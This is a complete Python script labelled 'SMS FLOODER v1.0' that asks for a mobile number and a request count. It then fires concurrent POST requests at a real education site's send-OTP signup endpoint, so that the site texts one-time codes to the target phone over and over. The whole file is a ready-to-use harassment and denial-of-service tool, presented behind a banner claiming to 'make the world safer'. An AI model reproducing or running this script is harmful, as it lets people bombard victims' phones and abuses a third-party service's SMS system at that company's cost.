import requests
import os
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor

# Function to clear the console screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to print the banner
def print_banner():
    banner = f'''
{Fore.RED}
▒██   ██▒    ▄▄▄          ▄▄▄▄       ██▓   ▄▄▄█████▓
▒▒ █ █ ▒░   ▒████▄       ▓█████▄    ▓██▒   ▓  ██▒ ▓▒
░░  █   ░   ▒██  ▀█▄     ▒██▒ ▄██   ▒██▒   ▒ ▓██░ ▒░
 ░ █ █ ▒    ░██▄▄▄▄██    ▒██░█▀     ░██░   ░ ▓██▓ ░
▒██▒ ▒██▒    ▓█   ▓██▒   ░▓█  ▀█▓   ░██░     ▒██▒ ░
▒▒ ░ ░▓ ░    ▒▒   ▓▒█░   ░▒▓███▀▒   ░▓       ▒ ░░
░░   ░▒ ░     ▒   ▒▒ ░   ▒░▒   ░     ▒ ░       ░
 ░    ░       ░   ▒       ░    ░     ▒ ░     ░
 ░    ░           ░  ░    ░          ░
                               ░
{Fore.RESET}

{Fore.YELLOW}THIS TOOL IS MADE BY XABIT v1.0 -- SMS FLOODER v1.0
LETS MAKE THE WORLD SAFER{Fore.RESET}
'''
    print(banner)

# Function to send POST requests
def send_post_request(num_requests, mobile):
    url = "https://services.utkarsh.com/api/bloger/cta/push-data"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://utkarsh.com",
        "Referer": "https://utkarsh.com/"
    }
    
    post_data = {
        "source_page": "https://utkarsh.com/",
        "event_to": "MoEngage",
        "ui_name": "JoinforFree",
        "cta_name": "cta_GetStart",
        "cta_type": "Sign Up CTA",
        "cta_route": "https://services.utkarsh.com/api/bloger/cta/push-data",
        "user_action": "send_otp",
        "record_id": "0",
        "name": "test",
        "mobile": mobile,
        "otp_1": "",
        "otp_2": "",
        "otp_3": "",
        "otp_4": "",
        "otp": ""
    }

    with ThreadPoolExecutor() as executor:
        for i in range(num_requests):
            print(f"Sending request {i + 1}/{num_requests}...")
            executor.submit(send_request, url, headers, post_data, i + 1)

# Function to send a single request and handle the response
def send_request(url, headers, post_data, request_number):
    try:
        response = requests.post(url, headers=headers, data=post_data)
        if response.status_code == 200:
            print(f"Request {request_number} completed successfully! Response: {response.text}")
        else:
            print(f"Request {request_number} failed! Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Request {request_number} encountered an error: {str(e)}")

if __name__ == "__main__":
    clear_screen()
    print_banner()
    
    try:
        number = input("Enter your mobile number: ")
        num_requests = int(input("Enter the number of requests to send: "))
        if num_requests <= 0:
            print("Please enter a positive number.")
        else:
            send_post_request(num_requests, number)
    except ValueError:
        print("Invalid input. Please enter a valid integer.")
